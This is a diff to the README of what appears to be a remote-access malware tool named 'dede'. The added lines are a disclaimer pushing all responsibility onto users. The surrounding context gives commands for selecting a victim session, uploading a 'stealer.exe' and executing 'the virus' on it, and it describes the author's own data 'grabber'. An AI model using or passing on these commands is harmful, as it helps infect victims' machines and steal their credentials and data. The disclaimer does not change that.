@@ -81,6 +81,10 @@ You need to run command like "dede ss si:12345" (si:<session-id>)
 
 You can upload ```dede upload (upload a stealer.exe) si:<session-id>``` a stealer and run ```dede execute path/of/stealer.exe si:<session-id>``` the virus because my grabber is so bad :(
 
+# Disclaimer:
+
+I do not accept responsibility for anything done with this tool, the responsibility lies with the person using the tool.
+
 # Thanks To :
 
 - LydexCoding
